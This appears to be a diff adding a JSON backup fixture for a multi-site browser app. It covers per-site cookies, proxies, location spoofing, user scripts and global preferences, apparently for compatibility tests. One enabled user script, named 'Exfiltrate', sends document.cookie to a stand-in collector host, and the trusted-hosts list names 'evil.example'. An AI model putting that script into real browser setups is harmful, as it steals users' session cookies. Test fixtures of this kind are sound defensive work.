@@ -1,0 +1,264 @@
+{
+  "version": 1,
+  "sites": [
+    {
+      "siteId": "compat-site-a",
+      "initUrl": "https://mail.example.com/",
+      "currentUrl": "https://mail.example.com/inbox",
+      "name": "Mail",
+      "pageTitle": "Inbox",
+      "cookies": [
+        {
+          "domain": ".example.com",
+          "expiresDate": 1893456000000,
+          "isHttpOnly": false,
+          "isSecure": false,
+          "isSessionOnly": false,
+          "name": "prefs",
+          "path": "/",
+          "sameSite": "Lax",
+          "value": "plain-cookie-value"
+        }
+      ],
+      "proxySettings": {
+        "type": 3,
+        "address": "127.0.0.1:1080",
+        "username": "proxyuser"
+      },
+      "javascriptEnabled": false,
+      "userAgent": "Mozilla/5.0 (X11; Linux x86_64) BackupCompatFixture/1.0",
+      "thirdPartyCookiesEnabled": true,
+      "incognito": false,
+      "alwaysOpenHome": false,
+      "kioskMode": true,
+      "language": "de",
+      "zoomPercent": 150,
+      "clearUrlEnabled": false,
+      "dnsBlockEnabled": false,
+      "contentBlockEnabled": false,
+      "trackingProtectionEnabled": false,
+      "localCdnEnabled": false,
+      "blockAutoRedirects": false,
+      "externalLinksInBrowser": true,
+      "fullscreenMode": true,
+      "tabBarButtonCorner": "topLeft",
+      "htmlCachingEnabled": true,
+      "notificationsEnabled": true,
+      "protectedContentAllowed": true,
+      "userScripts": [
+        {
+          "id": "site-script-a",
+          "name": "Exfiltrate",
+          "source": "fetch('https://collector.example/' + document.cookie)",
+          "injectionTime": 0,
+          "enabled": true
+        }
+      ],
+      "enabledGlobalScriptIds": [
+        "global-script-1"
+      ],
+      "blockedCookies": [
+        {
+          "name": "_ga",
+          "domain": ".example.com"
+        }
+      ],
+      "locationMode": "live",
+      "spoofLatitude": 52.52,
+      "spoofLongitude": 13.405,
+      "spoofAccuracy": 25.5,
+      "spoofTimezone": "Europe/Berlin",
+      "spoofTimezoneFromLocation": true,
+      "liveLocationGranularity": "approximate",
+      "webRtcPolicy": "relayOnly",
+      "letterboxEnabled": true,
+      "spoofWindowWidth": 1280,
+      "spoofWindowHeight": 720,
+      "fingerprintResetNonce": "compat-nonce-1",
+      "customIconPng": "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR4nGP4z8DwHwAFAAH/iZk9HQAAAABJRU5ErkJggg==",
+      "domainClaims": [
+        {
+          "kind": "exactHost",
+          "value": "mail.example.com"
+        },
+        {
+          "kind": "wildcardSubdomain",
+          "value": "example.com"
+        }
+      ]
+    },
+    {
+      "siteId": "compat-site-b",
+      "initUrl": "https://private.example.net/",
+      "name": "Private",
+      "cookies": [],
+      "proxySettings": {
+        "type": 1,
+        "address": "http-proxy.example:3128",
+        "username": null
+      },
+      "javascriptEnabled": true,
+      "userAgent": "",
+      "thirdPartyCookiesEnabled": false,
+      "incognito": true,
+      "alwaysOpenHome": false,
+      "kioskMode": false,
+      "language": "fr",
+      "clearUrlEnabled": true,
+      "dnsBlockEnabled": true,
+      "contentBlockEnabled": true,
+      "trackingProtectionEnabled": true,
+      "localCdnEnabled": true,
+      "blockAutoRedirects": true,
+      "fullscreenMode": false,
+      "htmlCachingEnabled": false,
+      "notificationsEnabled": false,
+      "protectedContentAllowed": false,
+      "userScripts": [],
+      "locationMode": "spoof",
+      "spoofLatitude": 48.8566,
+      "spoofLongitude": 2.3522,
+      "spoofAccuracy": 50.0,
+      "spoofTimezone": "Europe/Paris",
+      "webRtcPolicy": "disabled"
+    },
+    {
+      "siteId": "compat-site-c",
+      "initUrl": "http://localhost:8080/",
+      "name": "Dashboard",
+      "cookies": [],
+      "proxySettings": {
+        "type": 0,
+        "address": null,
+        "username": null
+      },
+      "javascriptEnabled": true,
+      "userAgent": "",
+      "thirdPartyCookiesEnabled": false,
+      "incognito": false,
+      "alwaysOpenHome": true,
+      "kioskMode": false,
+      "language": null,
+      "clearUrlEnabled": true,
+      "dnsBlockEnabled": true,
+      "contentBlockEnabled": true,
+      "trackingProtectionEnabled": true,
+      "localCdnEnabled": true,
+      "blockAutoRedirects": true,
+      "fullscreenMode": false,
+      "htmlCachingEnabled": false,
+      "notificationsEnabled": false,
+      "userScripts": [],
+      "locationMode": "off",
+      "spoofAccuracy": 50.0,
+      "webRtcPolicy": "defaultPolicy"
+    },
+    {
+      "siteId": "compat-site-d",
+      "initUrl": "file:///notes.html",
+      "currentUrl": "file:///notes.html",
+      "name": "notes",
+      "pageTitle": "notes",
+      "cookies": [],
+      "proxySettings": {
+        "type": 0,
+        "address": null,
+        "username": null
+      },
+      "javascriptEnabled": true,
+      "userAgent": "",
+      "thirdPartyCookiesEnabled": false,
+      "incognito": false,
+      "alwaysOpenHome": false,
+      "kioskMode": false,
+      "language": null,
+      "clearUrlEnabled": true,
+      "dnsBlockEnabled": true,
+      "contentBlockEnabled": true,
+      "trackingProtectionEnabled": true,
+      "localCdnEnabled": true,
+      "blockAutoRedirects": true,
+      "fullscreenMode": false,
+      "htmlCachingEnabled": false,
+      "notificationsEnabled": false,
+      "userScripts": [],
+      "locationMode": "off",
+      "spoofAccuracy": 50.0,
+      "webRtcPolicy": "defaultPolicy"
+    }
+  ],
+  "webspaces": [
+    {
+      "id": "ws-compat-work",
+      "name": "Work",
+      "siteIds": [
+        "compat-site-a",
+        "compat-site-c",
+        "compat-site-d"
+      ]
+    },
+    {
+      "id": "ws-compat-private",
+      "name": "Private",
+      "siteIds": [
+        "compat-site-b"
+      ]
+    }
+  ],
+  "themeMode": 26,
+  "globalPrefs": {
+    "showUrlBar": true,
+    "showTabStrip": true,
+    "tabStripInFullscreen": true,
+    "tabBarButton": true,
+    "tabBarButtonOnRight": false,
+    "fullscreenOnShortcut": false,
+    "tabMaxWidth": 200,
+    "showStatsBanner": false,
+    "osmTileUrl": "https://tiles.example.org/{z}/{x}/{y}.png",
+    "globalOutboundProxy": "{\"type\":2,\"address\":\"global-proxy.example:8443\",\"username\":\"globaluser\"}",
+    "linkHandlingEnabled": false,
+    "linkHandlingClaimDomains": true,
+    "trustedHosts": [
+      "evil.example|443|tls-pin-needle-c0de"
+    ],
+    "useUboResources": false,
+    "appLocaleOverride": "de",
+    "firefoxUaAutoRefresh": true,
+    "backForwardCacheEnabled": false
+  },
+  "selectedWebspaceId": "ws-compat-work",
+  "currentIndex": 2,
+  "exportedAt": "2026-09-23T23:21:25.418278",
+  "suggestedSites": [
+    {
+      "name": "Example",
+      "url": "https://example.com",
+      "domain": "example.com"
+    }
+  ],
+  "globalUserScripts": [
+    {
+      "id": "global-script-1",
+      "name": "Global invert",
+      "source": "document.documentElement.style.filter = 'invert(1)'",
+      "injectionTime": 0,
+      "enabled": true
+    }
+  ],
+  "dnsBlockLevel": 4,
+  "contentBlockerLists": [
+    {
+      "id": "easylist",
+      "name": "EasyList",
+      "url": "https://easylist.to/easylist/easylist.txt",
+      "enabled": true
+    },
+    {
+      "id": "custom-1",
+      "name": "Custom",
+      "url": "https://filters.example/list.txt",
+      "enabled": false
+    }
+  ]
+}
